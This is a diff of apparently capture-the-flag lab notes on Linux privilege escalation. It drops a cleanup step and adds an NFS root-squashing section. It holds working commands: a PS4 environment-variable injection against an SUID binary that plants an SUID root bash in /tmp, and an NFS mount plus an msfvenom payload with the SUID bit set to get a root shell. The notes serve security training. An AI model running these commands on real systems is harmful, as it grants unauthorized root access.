@@ -2,7 +2,6 @@ SUID / SGID Executables - Abusing Shell Features (#2)
 Note: This will not work on Bash versions 4.4 and above.
 
 When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
-
 Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
 
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
@@ -11,7 +10,28 @@ Run the /tmp/rootbash executable with -p to gain a shell running with root privi
 
 /tmp/rootbash -p
 
-Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
 
-rm /tmp/rootbash
-exit
+------------------------------------------------
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+Check the NFS share configuration on the Debian VM:
+
+cat /etc/exports
+
+Note that the /tmp share has root squashing disabled.
+On your Kali box, switch to your root user if you are not already running as root:
+sudo su
+
+Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
+
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+
+Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+Still using Kali's root user, make the file executable and set the SUID permission:
+chmod +xs /tmp/nfs/shell.elf
+
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+/tmp/shell.elf
+
